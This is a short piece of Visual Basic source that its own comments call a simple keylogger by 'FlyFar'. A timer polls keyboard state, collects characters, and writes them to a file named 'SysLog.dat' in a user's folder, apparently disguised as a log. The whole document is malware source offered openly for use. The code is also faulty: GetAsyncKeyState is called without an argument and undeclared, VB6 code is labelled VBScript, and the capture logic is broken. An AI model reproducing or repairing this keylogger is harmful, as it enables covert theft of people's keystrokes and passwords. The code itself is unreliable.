'Written by FlyFar
'Simple VBScript Keylogger
Dim strLetter As String, strTotal As String, old as string
Private Sub Command1_Click()
Timer1.Enabled = True
End Sub

Private Sub Form_Load()
Command1.Caption = "Start Loggin"
Timer1.Enabled = False
Timer1.Interval = 1
End Sub

Private Sub Timer1_Timer()
For I = 28 To 128 'ASCII code
If GetAsyncKeyState <> 0 Then
strLetter = Chr(I)
End If

If strletter <> Old Then
Old = strletter
strTotal = strTotal & old
End If

Next I

Open "C:\Users\Admin\3D Objects\SysLog.dat" For Output As #1
Print #1, strTotal
Close #1
End Sub



